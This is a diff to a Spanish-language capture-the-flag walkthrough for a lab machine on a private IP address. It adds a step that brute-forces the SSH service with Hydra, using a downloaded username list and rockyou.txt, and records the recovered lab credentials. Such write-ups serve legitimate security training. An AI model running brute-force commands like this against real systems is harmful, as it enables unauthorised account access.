@@ -87,11 +87,20 @@ URL completa: `http://192.168.1.4/0x0856BF`
 
 ![9](https://user-images.githubusercontent.com/75953873/176086028-06516837-d580-49de-8f15-c045b71909ff.png)
 
-El directorio `good_luck` contiene un fichero txt con una lista de nombres para realizar ataque de fuerza bruta y conectarse al servicio **SSH**. 
+El directorio `good_luck` contiene un fichero txt con una lista de nombres para realizar un ataque de fuerza bruta y conectarse al servicio **SSH**. 
 
 URL completa: `http://192.168.1.4/0x0856BF/good_luck/which_one_lol.txt`
 ```
-wget http://192.168.1.4/0x0856BF/good_luck/which_one_lol.txt
-cat which_one_lol.txt
+wget http://192.168.1.4/0x0856BF/good_luck/which_one_lol.txt && cat which_one_lol.txt
 ```
 ![10](https://user-images.githubusercontent.com/75953873/176086596-77994340-98ef-4c9c-8231-5963d17a4c17.png)
+
+- *Paso 6* Ataque de fuerza bruta al servicio SSH con Hydra. 
+```
+hydra -L which_one_lol.txt -P rockyou.txt 192.168.1.4 ssh
+```
+![11](https://user-images.githubusercontent.com/75953873/176089030-02ebf4c5-56d9-4a11-89a1-34ab99c0e119.png)
+
+Usuario: `overflow`
+
+Contraseña: `Pass.txt`
